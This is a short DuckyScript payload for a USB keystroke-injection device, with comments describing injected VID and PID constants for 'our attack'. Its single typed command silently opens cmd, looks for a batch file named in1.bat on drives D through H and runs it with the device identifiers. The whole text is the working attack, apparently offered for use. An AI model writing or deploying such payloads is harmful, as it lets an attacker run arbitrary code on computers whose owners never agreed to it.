  REM To run we tell the agent the VID and PID of this device. That way it knows exactly what device to talk to
  REM The interpreter injects some 'constants' like #_VID_ and #_PID_.
  REM This is to keep compatibility with DuckyScript3 but allows us to have dynamic variables we can use in our attack
  STRING cmd /c @echo off & for %d in (D E F G H) do if exist %d:\in1.bat %d:\in1.bat #_VID_ #_PID_
